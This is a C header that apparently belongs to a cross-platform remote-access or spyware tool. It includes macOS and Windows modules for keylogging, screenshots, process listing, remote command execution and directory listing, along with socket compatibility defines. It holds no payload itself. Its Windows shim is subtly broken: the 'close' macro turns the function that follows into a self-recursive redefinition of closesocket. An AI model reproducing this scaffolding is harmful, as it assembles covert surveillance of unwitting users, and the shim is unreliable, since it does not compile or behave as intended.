#pragma once
#ifdef __APPLE__
    #include "function_unix/ListProcesses.h"
    #include "function_unix/AppCMD.h"
    #include "function_unix/Screenshot.h"
    #include "function_unix/Keylog.h"
    #include "function_cross/ListDirTree.h"

    #define SOCKET_ERROR -1
#elif _WIN32
    #define WIN32_LEAN_AND_MEAN
    #include <Windows.h>

    #include "function_Windows/AppCMD.h"
    #include "function_Windows/KeyLog.h"
    #include "function_Windows/ListDirTree.h"
    #include "function_Windows/ListProcesses.h"
    #include "function_Windows/Screenshot.h"
    
    #define close closesocket
    #define poll WSAPoll

    int close(int fd) {return closesocket(fd);}
#endif

